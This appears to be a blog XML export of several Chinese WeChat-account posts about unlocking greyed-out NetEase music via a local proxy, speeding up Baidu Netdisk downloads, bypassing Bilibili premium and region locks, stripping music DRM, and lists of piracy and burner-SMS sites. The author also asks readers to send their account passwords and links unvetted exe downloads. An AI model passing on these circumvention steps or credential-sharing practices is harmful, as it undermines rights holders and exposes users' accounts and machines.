    <url>%2F2020%2F08%2F28%2F%E4%B8%80%E9%94%AE%E8%A7%A3%E9%94%81%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E5%8F%98%E7%81%B0%E6%AD%8C%E6%9B%B2%EF%BC%8C%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E4%B9%9F%E8%83%BD%E5%90%AC%E5%91%A8%E6%9D%B0%E4%BC%A6%E4%BA%86%2F</url>
    <content type="text"><![CDATA[苏生不惑第163 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于网易云音乐之前写过以下文章，有兴趣可以点击阅读： 那些你可能不知道的网易云音乐奇技淫巧 不想下载那么多音乐软件？全网音乐在线听和下载 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 网易云音乐等级快速升级：每天自动打卡听歌300首 现在每天早上8点20给几十个网易账号打卡听歌300首（如果想给你的账号打卡升级发你的账号和md5加密后的密码给我），目前用的腾讯云的云函数免费服务，应该可以一直打卡下去。 我的网易账号已经自动听歌4800+首歌了。 现在网易云音乐已经没有了周杰伦的音乐版权，所有歌曲没法听了，还是很难受的，于是不少人转向了 QQ 音乐。 这里分享一个工具（基于开源项目Unlock-netease-cloud-music），一键解锁网易云音乐变灰歌曲，重新听那些动听的旋律。 手动打包安装教程见 https://github.com/nondanee/UnblockNeteaseMusic/issues/22 先安装nodejs https://nodejs.org/en/download/，克隆项目仓库1234git clone https://github.com/nondanee/UnblockNeteaseMusic.git cd UnblockNeteaseMusic λ node app.jsHTTP Server running @ http://0.0.0.0:8080 填写脚本地址 http://127.0.0.1:8080/proxy.pac123456function FindProxyForURL(url, host) &#123; if (host == 'music.163.com' || host == 'interface.music.163.com' || host == 'interface3.music.163.com' || host == 'apm.music.163.com' || host == 'apm3.music.163.com' || host == '59.111.181.38' || host == '59.111.181.60' || host == '223.252.199.66' || host == '223.252.199.67' || host == '59.111.160.195' || host == '59.111.160.197' || host == '59.111.181.35' || host == '118.24.63.156' || host == '193.112.159.225' || host == '115.236.118.33' || host == '115.236.121.1' || host == '47.100.127.239' || host == '39.105.63.80' || host == '101.71.154.241') &#123; return 'PROXY 127.0.0.1:8080' &#125; return 'DIRECT' &#125; 也可以项目根目录里新建一个 .bat 文件，写入 node app，之后双击就可以启动了。或者在项目根目录执行 npm link，之后在命令行或者 win +r 里直接输入 unblockneteasemusic 就能启动。 有 node 环境的话可以自己打包1234567891011121314151617181920212223npm install pkgnpm run pkgλ npm install pkgnpm WARN deprecated request@2.88.2: request has been deprecated, see https://github.com/request/request/issues/3142npm WARN deprecated har-validator@5.1.5: this+ pkg@4.4.9added 122 packages in 8.918sd:\download\UnblockNeteaseMusic (master) (@nondanee/unblockneteasemusic@0.25.3)λ npm run pkg&gt; @nondanee/unblockneteasemusic@0.25.3 pkg d:\download\UnblockNeteaseMusic&gt; pkg . --out-path=dist/&gt; pkg@4.4.9&gt; Targets not specified. Assuming: node8-linux-x64, node8-macos-x64, node8-win-x64&gt; Fetching base Node.js binaries to PKG_CACHE_PATH fetched-v8.17.0-linux-x64 [====================] 100% fetched-v8.17.0-win-x64 [====================] 100% fetched-v8.17.0-macos-x64 [====================] 100%&gt; Warning Cannot find module 'long' from 'D:\download\UnblockNeteaseMusic\src' %1: D:\download\UnblockNeteaseMusic\src\kwDES.js 本地生成3个平台的文件。 解锁网易云音乐先下载软件（公众号内回复 音乐 获取） https://www.lanzoux.com/i2OqCfml66f小工具 https://www.lanzoux.com/iSnsZfgectg ，其实就是一个exe文件，直接双击运行。 运行后会监听本地8080端口，然后下载网易客户端软件https://music.163.com/#/download打开设置开启自定义代理，服务器填写127.0.0.1，端口8080。代理设置后重启客户端。 对比下开启代理前周杰伦的歌曲都是灰色的。 开启后可以正常听了。还能下载到本地。下载后的歌曲（或者本地歌曲）还可以传上去，网易会自动匹配。 这样网页和APP上都可以听了 https://music.163.com/#/song?id=186016 命令行也可以看到程序在运行。用的酷我的地址 http://ev.sycdn.kuwo.cn/4b6586978d768b33c41d0915e46086ba/5f3920bc/resource/n1/39/67/2304902463.mp3 下面开始在APP端加代理，这样APP内也能听周杰伦歌曲了。 打开WiFi设置，开启代理为手动，填写服务器ip地址和端口，ip地址可以在命令行输入ipconfig获取。 保存后重启APP，对比下开启代理前歌曲都是灰色不可点。 开启后可以点击听了。听一首我的地盘。评论也可以分享出来。 如果嫌使用软件麻烦，可以直接使用在线pac代理。 pac代理pac代理其实就是一个代理网址，不过我不推荐用这个，因为不知道别人的服务有没有抓取你的数据，在WiFi设置里代理改为自动，填写pac地址为 https://wy.ydlrqx.com/proxy.pac，效果是一样的，不过需要注意的是如果想使用其他软件需关闭代理。 如果想下载音乐可以试试咪咕音乐，这里周杰伦的歌曲都是免费可以听的。 下载音乐比如周杰伦歌曲《七里香》http://music.migu.cn/v3/music/album/7949，标准的音质是40kbps，直接用idm下载。在线听周杰伦所有歌曲 http://tool.liumingye.cn/music/?page=searchPage http://music.y444.cn/#/ http://mini.tongzhong.xyz/ 切换为高清320kbps，文件从1MB到11MB。 另外网易歌曲比如许巍这首《我的爱》https://music.163.com/m/song?id=1303026566，其中的id 1303026566就是歌曲的唯一标识，直接打开这个地址 https://music.163.com/song/media/outer/url?id=1303026566.mp3，就能下载了。 如果是其他平台上下载的歌曲是特定格式，比如QQ音乐qmc,网易ncm，本地播放器没法播放，这就需要工具来转换，推荐在线工具 https://tool.ixarea.com/music/ ，可以轻松移除 QQ 音乐、网易云音乐等音乐软件的加密付费音乐。 最后分享个网站，那些经典的网易云语录https://nd.2890.ltd/ 大家的点赞和在看转发对我非常重要，如果文章对你有帮助还请支持下， 感谢各位！ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一键生成你的微信社交数据报告]]></title>
    <url>%2F2020%2F08%2F14%2F%E4%B8%80%E9%94%AE%E7%94%9F%E6%88%90%E4%BD%A0%E7%9A%84%E5%BE%AE%E4%BF%A1%E7%A4%BE%E4%BA%A4%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%91%8A%2F</url>
    <content type="text"><![CDATA[苏生不惑第162 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于微信之前写过以下文章，有兴趣可以点击阅读： 如何导出你的微信语音 c 盘空间又满了？微信清理神器帮你释放空间 微信撤回的消息也能看到！ 如何备份可能被删的公众号文章和网页 如何在电脑上登陆多个微信 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 今天分享的是一键生成你的微信社交数据报告（公众号内回复 微信 获取工具）,这个工具是基于python对微信好友进行全方位数据分析，包括：昵称、性别、年龄、地区、备注名、个性签名、头像、群聊、公众号等，最后生成图片。 先说明下，这个工具是基于访问微信网页版 https://wx.qq.com/ 来运行的，如果你的微信登陆不了网页版微信就没办法了。 使用非常简单，双击exe文件直接执行，会弹出微信二维码。 用微信扫码登录开始运行。注意登录后电脑上的微信会退出。命令行可以看到在分析你的微信好友数据，这个不会给你的微信好友发消息的，放心。开始下载微信好友头像，我有996个好友，如果几千好友时间可能会长点。 开始人脸识别。开始拼接头像。等待一会结束后会在当前目前生成一个文件 微信个人数据报告.html，我把文件放在我服务器上，公众号内回复 微信 可以看到我的微信好友数据http://122.51.155.172:8002/wechat/浏览器打开这个html文件可以看到你的微信数据，我的微信好友里广东地区最多，有101人，其次是北京86人。广东中深圳好友最多，有47人。微信好友性别比中男人571，占比57%。因为很多好友没有设置备注（808人），显示认识的比例比较少。同样没有备注所以我最亲密的人都是0。特殊好友分析可以看到星标，不让他看我朋友圈，不看他朋友圈，消息置顶，陌生人数据。微信好友中谁跟我在同一个群（最多和某某某同在3个微信群），昵称我就打马赛克了。 我的微信好友个性签名生成的词云图，关于词云可以看之前的文章 Python 词云分析周杰伦新歌《说好不哭》996个微信好友里有180人用了真实人脸头像。所有微信好友头像拼成的一张图，比较大，还是比较壮观的。 前几天北京很热，我发了条朋友圈 北҈京҈热҈得҈字҈出҈汗҈了҈ ，有人问怎么发出来的，其实就是加了个\u0488编码 copy(&#39;北\u0488京\u0488热\u0488得\u0488字\u0488出\u0488汗\u0488了\u0488&#39;)，更多有意思的编码看这个网站 https://unicode-table.com/cn 大家的点赞和在看转发对我非常重要，如果文章对你有帮助还请支持下， 感谢各位！ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020年8月最新免费加速下载百度网盘文件方法]]></title>
    <url>%2F2020%2F08%2F14%2F2020%E5%B9%B48%E6%9C%88%E6%9C%80%E6%96%B0%E5%85%8D%E8%B4%B9%E5%8A%A0%E9%80%9F%E4%B8%8B%E8%BD%BD%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[苏生不惑第161 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于百度网盘之前已经写过很多文章了，可点击阅读： 2020 年 3 月最新加速下载百度网盘文件方法 2020 年 4 月使用 Aria2 加速下载百度网盘文件 2020 最全百度网盘搜索，找电影资源不再愁 没有提取码怎么获取百度网盘资源？ 2020年7月最新加速下载百度网盘文件方法 前2天微信群里有小伙伴反馈之前分享的网盘助手油猴脚本用不了，点击生成链接没反应，去油猴脚本反馈页面看了下 https://greasyfork.org/zh-CN/scripts/378301-%E7%BD%91%E7%9B%98%E5%8A%A9%E6%89%8B/feedback，果然用不了 。 不过今天（8月10日）再试了下，更新脚本又能用了。 这里就再整理下免费加速下载百度网盘文件方案。 油猴扩展关于油猴之前文章已经介绍过了实用油猴脚本推荐，让你的谷歌浏览器更强大，油猴Chrome扩展地址https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN ，如果上不了谷歌参考之前文章 上不了谷歌如何安装 Chrome 扩展？ 或者公众号后台回复 油猴 手动安装，这款扩展有900万+用户安装过，值得信赖。 Chrome扩展安装好后打开 https://greasyfork.org/zh-CN 选择对应的脚本安装即可。 安装好的脚本在管理面板可以看到。 油猴脚本网盘助手安装完油猴扩展就可以安装网盘助手脚本了，地址 https://greasyfork.org/zh-CN/scripts/378301 这个脚本主要功能有获取百度网盘、腾讯微云、蓝奏云、天翼云盘的提取码 ，百度网盘生成并展示下载链接，百度网盘分享时自定义提取码，解除一分钟观看限制。 有些网盘分享地址设置了提取码，没有提取码是打不开的，不过安装网盘助手后会自动帮你获取提取码。 当然这个不是百分之百能提取成功，再分享个提取码查询工具（公众号内回复 网盘 获取工具）。https://wwa.lanzous.com/iTxKgfg7h3i 这个提取码6688是我手动设置的，默认是随机生成，安装这个油猴脚本后就可以自定义了。 如果想自动识别并标记百度云、蓝奏云、腾讯微云和天翼云盘的链接状态推荐脚本 网盘链接检查 https://greasyfork.org/zh-CN/scripts/394216 或者Chrome扩展 云盘管家 https://chrome.google.com/webstore/detail/%E4%BA%91%E7%9B%98%E7%AE%A1%E5%AE%B6/bklfngffhhiicendpbchobpngddbgiba安装以后网页上的网盘链接会自动标识是否失效了，不用点进去见资源失效再关闭网页。 接下来配合使用 idm （公众号内回复 网盘 获取idm软件，如果你是Mac系统使用ndm）来加速下载百度网盘文件，之前文章2020 年 3 月最新加速下载百度网盘文件方法 也介绍过，选中文件后点击生成链接会弹出提示2个下载链接，官方和直链地址。右键下载地址选择使用idm下载。弹出下载框，点击开始下载。下载速度能达到2MB/s（因人而异，你的可能更快）。 我录制了个GIF动图。 如果提示403错误，修改应用ID为778750，下载速度还是很快的。 如果你用的Mac系统，使用ndm来下载一样的。 naifei + idm使用naifei就更简单点，首先生成了一个网盘分享链接: https://pan.baidu.com/s/1kfEcPLSAE-VLFHrM76RXxg 提取码: 6688，之后将链接替换 http://pan.naifei.cc/?share=id&amp;pwd=pwd 这里的参数， id代表网盘分享链接里的1kfEcPLSAE-VLFHrM76RXxg，pwd代表密码，就是6688，直接打开地址 http://pan.naifei.cc/?share=1kfEcPLSAE-VLFHrM76RXxg&amp;pwd=6688 可以看到文件名和大小及下载地址，直接点我下载，弹出idm下载框开始下载。或者直接打开 https://pan.naifei.cc/new/ ，复制网盘地址提交。如果嫌麻烦还可以安装一个油猴脚本 https://greasyfork.org/zh-CN/scripts/406851-naifei ，在打开别人分享的百度网盘链接时，显示一个直达pan.naifei.cc 的下载按钮。 这个下载速度和油猴脚本差不多。 当然还可以使用工具（公众号内回复 网盘 获取软件），只要复制网盘链接，自动解析，然后点下载。 这个方法可谓最简单了，不用登录网盘账号，防止被百度限速，不过不知道能挺多久，大家且用且珍惜。 最后分享两个找电影台词网站 http://www.subzin.com/，http://zhaotaici.cn/ 一个百度网盘搜索工具（360可能报毒） https://www.lanzoux.com/i8BRPfga3ed，双击标题跳转网盘地址。下载文件就参考上面文章了。 如果搜不到资源参考之前文章2020 最全百度网盘搜索，找电影资源不再愁 ，这个网站堪称宝藏，收藏起来吧 ，以及磁力搜 https://magnetw.app/guide/ 下载对应的客户端，支持Windows和mac，应该没有找不到的资源。 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[这个网站堪称宝藏，收藏起来吧]]></title>
    <url>%2F2020%2F08%2F07%2F%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%A0%AA%E7%A7%B0%E5%AE%9D%E8%97%8F%EF%BC%8C%E6%94%B6%E8%97%8F%E8%B5%B7%E6%9D%A5%E5%90%A7%2F</url>
    <content type="text"><![CDATA[苏生不惑第160 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于有趣实用的网站之前分享过很多： 那些有趣的网站 那些有趣的网站（二） 那些有趣的网站系列（三） 那些你可能用得上的在线办公神器 那些你可能用得上的在线办公神器（二） 那些你可能用得上的在线办公神器系列（三） 今天分享的这个合集网堪称宝藏 https://www.heji.ltd/ ，左侧导航可以预览，而且网站会一直更新。 在线影视视频网站合集最近更新时间是7月16日。包含8类网站，结合之前分享的百度网盘搜索网站2020 最全百度网盘搜索，找电影资源不再愁，应该没有找不到的电影电视剧。123456781 会员制影视剧网站2 免费在线影视网址汇总3 在线欧美剧网站汇总4 在线动漫网站汇总5 在线国语版视频站6 在线日韩网站汇总7 在线泰剧网站8 VIP视频解析 阅读电子书小说网站APP合集最近更新时间是5月16日。包含5大类，可以结合之前文章 搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定 来找电子书：123451 小说网站2 APP3 IOS4 书荒书单推荐5 有声小说 漫画APP网站在线观看合集最近更新时间是6月21日，包含4大类。12341 日本漫画2 国产动漫3 韩国漫画4 漫画APP 体育NBA直播观看网站合集最近更新时间是2月27日，喜欢体育的可以收藏下。 网盘合集最近更新时间是7月26日，包含4大类，除了百度网盘还有其他选择。12341 长期保存文件网盘2 临时中转文件网盘3 视频网盘4 在线传输文件 磁力链接BT合集最近更新时间是6月20日，包含6大类，推荐一个开源的磁力搜https://magnetw.app/guide/ ，有对应的客户端，支持Windows和mac 。1234561 国内磁力搜索2 国外磁力搜索3 磁力下载站4 种子下载站5 电驴下载站6 公共 BitTorrent Tracker 国内外短信接码平台合集最近更新时间是7月29日，包含5大类，用于注册小号，除了临时短信还有临时邮箱，之前也分享过文章怕被发垃圾邮件？用临时邮箱来注册账号123451 国外免费接码平台2 国内免费接码平台3 国外收费接码平台4 国内收费接码平台5 软件 网址导航合集最近更新时间是7月22日，有很多专业的导航网站。 下载工具合集最近更新时间是8月1日，包含13个类别，我比较喜欢用idm，下载视频可参考之前文章 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 软件APP网盘合集最近更新时间是8月4日，n多软件分享。 电影下载资源合集最近更新时间是2月11日，有很多电影明星个人作品合集，比如成龙，周星驰，李建杰等，下载百度网盘电影文件参考之前文章2020年7月最新加速下载百度网盘文件方法 电视剧资源合集最近更新时间是2月25日，有很多经典电视剧，比如生活大爆炸，武林外传，权力的游戏等。 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不会 ps 没关系，在线一键抠图]]></title>
    <url>%2F2020%2F08%2F07%2F%E4%B8%8D%E4%BC%9A-ps-%E6%B2%A1%E5%85%B3%E7%B3%BB%EF%BC%8C%E5%9C%A8%E7%BA%BF%E4%B8%80%E9%94%AE%E6%8A%A0%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[苏生不惑第159 篇原创文章，将本公众号设为星标，第一时间看最新文章。 ps中抠图是个麻烦，有时候需要抠图，无奈不会ps（比如我），这里就推荐几个智能在线抠图工具，只需上传图片，点击抠图，几秒就能获得你想要的透明背景图片。 remove.bghttps://www.remove.bg/zh 这个网站比较知名了，上传图片5秒内利用AI工具帮助你自动抠图。 除了在线网站还提供客户端版本，注册后申请api使用 https://www.remove.bg/zh/tools-api 。 如果想一键去除视频背景可以使用 https://www.unscreen.com/ ，它支持mp4、gif、mov、.webm、.ogg等格式，上传视频或者gif自动去除背景，和 remove.bg 是同一家公司出品。 以武林外传中秋节一段视频为例。 搞定抠图 https://www.gaoding.com/koutu 帮你自动识别需要保留的主体并去除背景。一键上传图片即可快速实现抠图。 生成效果图 aipixhttps://aipix.net/ 100%自动，免费，在线换背景，一键抠图消除图片背景色，5秒内完成自动消除背景，基础抠图操作和换个照片底色都没问题。 clippingmagic https://zh.clippingmagic.com 魔术般地删除图像背景，全自动处理，并远远超越 AI。 皮卡智能http://www.picup.shop/currency.html#/ 在线抠图免费换背景图片。 slazzerhttps://slazzer.com/ 抠图神器，5秒内一键抠图换背景，可以批量上传图片，自定义调整，生成图片质量高。 抠图ps小程序手机上使用小程序最方便了，随便搜了个小程序，效果还行。 如果觉得上面网站生成效果还不满意，可以使用在线ps 来处理。 在线ps不用安装庞大的 ps软件，直接在线ps，将图片、视频、实时摄像头的画面进行特效处理 https://www.uupoop.com/ 其他类似的网站还有 http://editor.pho.to/zh/ ， https://ps.gaoding.com/#/https://editor.polaxiong.com/ ，https://www.photopea.com/ 更多在线工具网站可点击以下文章： 那些你可能用得上的在线办公神器 那些你可能用得上的在线办公神器（二） 那些你可能用得上的在线办公神器系列（三）| 公众号后台回复关键词 | 用途 || — | — || 微信 | 获取你的微信好友头像拼图及查看微信撤回消息 || b站 | 获取下载b站视频工具及找回被删b站视频方法 || 视频 | 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 || 百度网盘 | 获取加速下载网盘文件方法及查找电影电视剧网站 || 朋友圈 | 获取发空白朋友圈方法 || 微博 | 获取备份微博工具及分析微博账号数据 || 音乐 | 获取下载音乐工具及在线听歌网站 || 油猴 | 获取油猴脚本 ||谷歌|获取安装Chrome扩展方法| 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何免登陆看b站大会员和限制港澳台地区番剧]]></title>
    <url>%2F2020%2F08%2F07%2F%E5%A6%82%E4%BD%95%E5%85%8D%E7%99%BB%E9%99%86%E7%9C%8Bb%E7%AB%99%E5%A4%A7%E4%BC%9A%E5%91%98%E5%92%8C%E9%99%90%E5%88%B6%E6%B8%AF%E6%BE%B3%E5%8F%B0%E5%9C%B0%E5%8C%BA%E7%95%AA%E5%89%A7%2F</url>
    <content type="text"><![CDATA[苏生不惑第158 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于b站之前已经写过了下列文章： 那些我关注的 b 站 up 主 bilibili(b站)升级到BV号了，还想用av号怎么办？ 那些你可能不知道的 bilibili 奇技淫巧 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 如何更优雅地使用 bilibili(b站) 如何找回bilibili(b站)收藏夹里失效的视频？ 今天分享的是解锁b站大会员和观看限港澳台地区的视频，这里使用的是油猴脚本。 安装油猴扩展关于油猴的强大功能之前写过实用油猴脚本推荐，让你的谷歌浏览器更强大 ，油猴Chrome扩展地址https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN ，如果上不了谷歌参考之前文章 上不了谷歌如何安装 Chrome 扩展？ 或者公众号后台回复 油猴 获取文件手动安装，这款扩展有900万+用户安装过，值得信赖。 扩展安装好了打开 https://greasyfork.org/zh-CN 选择对应的脚本安装即可。 观看限制港澳台地区视频某些视频会限制港澳台地区才能观看 https://www.bilibili.com/bangumi/play/ep276323 ，如图： 现在安装脚本 解除B站区域限制 https://greasyfork.org/zh-CN/scripts/25718 安装后再次刷新可以看到视频在加载 。 等待一会，点击确定就可以播放了。我录制了个GIF，使用的工具见之前文章那些好用的 GIF 录制工具 你还可以对脚本设置做更改。 观看大会员视频有些番剧需要大会员才能观看，如图： b站的会员价格包年148，如果你只是偶尔看看觉得没必要买可以使用油猴脚本来搞定。 这里安装大会员视频替换脚本 https://greasyfork.org/zh-CN/scripts/402898 ，可惜脚本被删了 ，在公众号内回复 b站 获取脚本，是个zip压缩文件 。https://wwa.lanzous.com/iHR03f8kmgb 然后打开油猴管理面板的实用工具页面，导入点击选择文件。 点击导入。 再次刷新页面 https://www.bilibili.com/bangumi/play/ss5978 ，右下角有个替换播放器按钮。 点击 火影忍者：博人传之次世代继承者(源1) ，如果没有自动获取到播放源，可以输入关键词查询。 成功进入播放页面，弹幕也能看到。 弹幕还可以下载，其实就是地址 https://api.bilibili.com/x/v1/dm/list.so?oid=15915981 ，会在本地生成弹幕文件 博人传 火影忍者新时代：第1话.ass 。 找回b站视频再说下之前写过的如何找回bilibili(b站)收藏夹里失效的视频？ ，有人问如果不在收藏夹的视频怎么找回，直接在网站 https://www.biliplus.com/ 输入播放地址即可。 如果还想下载b站视频参考之前文章 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 最后是发福利了，免费赠送一个b站年度大会员（可折现148块），这次不按评论点赞数来算了，获取规则就是在文章末尾评论，可以是对公众号的建议或者问题什么的，最后我选一个觉得最好的（截止时间8月5号8点20，也就是我每天发文章时间），公众号限制只能放100条评论，所以概率是百分之一，不算低了，赶紧来试试吧。 大家的点赞和在看转发对我非常重要，如果文章对你有帮助还请支持下， 感谢各位！ 另外有问题或需要的小伙伴也可以加我微信，之前已经帮助过不少小伙伴了，都是免费的。比如网易云音乐打卡。Python备份微博。都是免费指导的。 推荐历史文章谷歌浏览器安装的 Chrome 扩展越来越多，怎么管理？ 那些经典好玩的在线游戏：魂斗罗，超级马里奥，坦克大战 那些你可能不知道的谷歌浏览器实用技巧 那些你可能不知道的 windows 奇技淫巧 网易云音乐等级快速升级：每天自动打卡听歌300首 再谈备份微博 如何去除烦人的垃圾广告 2020年7月最新加速下载百度网盘文件方法 关于 苏生不惑 公众号 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谷歌浏览器安装的 Chrome 扩展越来越多，怎么管理？]]></title>
    <url>%2F2020%2F08%2F07%2F%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E8%A3%85%E7%9A%84-Chrome-%E6%89%A9%E5%B1%95%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%A4%9A%EF%BC%8C%E6%80%8E%E4%B9%88%E7%AE%A1%E7%90%86%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[苏生不惑第157篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于Chrome扩展之前写过很多文章： 实用油猴脚本推荐，让你的谷歌浏览器更强大 Chrome 浏览器扩展神器油猴 请停用以开发者模式运行的扩展程序？搞定谷歌浏览器插件弹窗 上不了谷歌如何安装 Chrome 扩展？ Chrome 浏览器扩展神器暴力猴 再谈备份微博 再谈备份网页和公众号文章 那些你可能不知道的谷歌浏览器实用技巧 随着Chrome扩展安装得越来越多，不但占用电脑性能，管理起来也麻烦，这里推荐一个实用的Chrome扩展管理二管家（公众号内回复 谷歌 获取）。 二管家这是一个管理扩展的扩展 ，可以获取扩展更新通知并记录拓展历史，自动开启/关闭拓展，根据当前网站获取二管家社区推荐，Chrome 扩展地址 https://chrome.google.com/webstore/detail/nooboss/aajodjghehmlpahhboidcpfjcncmcklf ，安装Chrome扩展方法见之前文章 上不了谷歌如何安装 Chrome 扩展？ ，安装谷歌助手后就可以直接上谷歌安装Chrome扩展了。 二管家能干什么？管理扩展，社区分享，扩展历史记录，显示扩展详细信息。 在总览里可以看到我安装了128个扩展，并且为当前页面（b站）根据点赞数推荐了几个扩展（还有评价），第一个就是bilibili helper，这个之前的文章如何更优雅地使用 bilibili(b站) 介绍过了 ，不用再去谷歌商店搜索找合适的扩展了。选项里可以设置主题和开启关闭某些设置。 导出扩展到HTML会生成一个文件 Extensions.html，里面有每个扩展对应的谷歌商店地址 。历史页面可以看到每个扩展的安装、卸载、开启、关闭等记录。还有更新通知。 扩展管理页面可以给扩展分组，比如建一个工作组和生活组，一键开启和关闭扩展。扩展详情页可以查看manifest文件，下载crx，查看评分，查看权限，点击会跳转到谷歌商店。 扩展自动管理里页面可以设置规则，帮你实现扩展自动切换，让指定的扩展只在指定网页才启用，比如只有打开百度网盘页面才开启网盘助手扩展。 可以说二管家是一个必装的Chrome扩展，如果你安装了很多扩展的话，另外一个必装的扩展就是油猴了 https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo ，油猴的强大在之前文章实用油猴脚本推荐，让你的谷歌浏览器更强大 已经详细介绍过了。 扩展安装好了打开 https://greasyfork.org/zh-CN 选择对应的脚本安装即可。 比如下载百度网盘文件不再限速了 2020年7月最新加速下载百度网盘文件方法如果想安装更方便点可以安装这个脚本 https://greasyfork.org/zh-CN/scripts/24508-userscript-show-site-all-userjs ，直接推荐当前网站可安装的油猴脚本，不用自己搜索，点击直接安装。 如果没找到你想要的脚本，可以自己写个脚本，比如我之前写的 一个骚操作，公众号粉丝破10万！还有去除优酷腾讯爱奇艺网站上方的logo 如何更优雅地看电影/刷剧 ，安装脚本前：安装脚本后： 很久没发福利了，公众号后台回复 支付宝 领取支付宝红包，欢迎文末点赞在看转发支持。 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本，让你的谷歌浏览器更强大 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些经典好玩的在线游戏：魂斗罗，超级马里奥，坦克大战]]></title>
    <url>%2F2020%2F08%2F07%2F%E9%82%A3%E4%BA%9B%E7%BB%8F%E5%85%B8%E5%A5%BD%E7%8E%A9%E7%9A%84%E5%9C%A8%E7%BA%BF%E6%B8%B8%E6%88%8F%EF%BC%9A%E9%AD%82%E6%96%97%E7%BD%97%EF%BC%8C%E8%B6%85%E7%BA%A7%E9%A9%AC%E9%87%8C%E5%A5%A5%EF%BC%8C%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%2F</url>
